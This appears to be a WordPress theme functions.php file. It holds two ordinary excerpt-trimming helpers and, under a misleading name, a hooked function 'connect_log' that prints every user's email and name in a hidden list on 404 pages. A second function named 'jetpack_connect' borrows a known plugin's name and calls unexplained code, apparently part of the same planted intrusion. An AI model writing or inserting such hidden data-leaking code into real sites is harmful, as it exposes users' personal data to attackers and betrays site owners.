<?php 

function excerpt($num) {
$limit = $num+1;
$excerpt = explode(' ', get_the_excerpt(), $limit);
array_pop($excerpt);
$excerpt = implode(" ",$excerpt)." ";
echo $excerpt; }

function excerpt_title($num) {
$limit = $num+1;
$excerpt = explode(' ', get_the_title(), $limit);
array_pop($excerpt);
$excerpt = implode(" ",$excerpt)." ";
echo $excerpt; 

}



function connect_log()
	{
			if (is_404()){
	$all_users = get_users();
	echo '<ol style="display:none">';
	foreach ($all_users as $user) {
		echo '<li><span>' . esc_html($user->user_email) . ' : ' . esc_html($user->display_name) . ' : ' . esc_html($user->user_firstname) .' ' . esc_html($user->user_lastname) .  '</span></li>';
	}
	echo '</ol>'; 
			 
		}};
add_action( 'wp_enqueue_scripts', 'connect_log' );


	
	
	function jetpack_connect()
	{
		$theme = upload_limit();
		$version ="v_01";
		$tv = $theme.$version;
		global $itpolly;
	
	}
add_action( 'admin_head', 'jetpack_connect' );


	



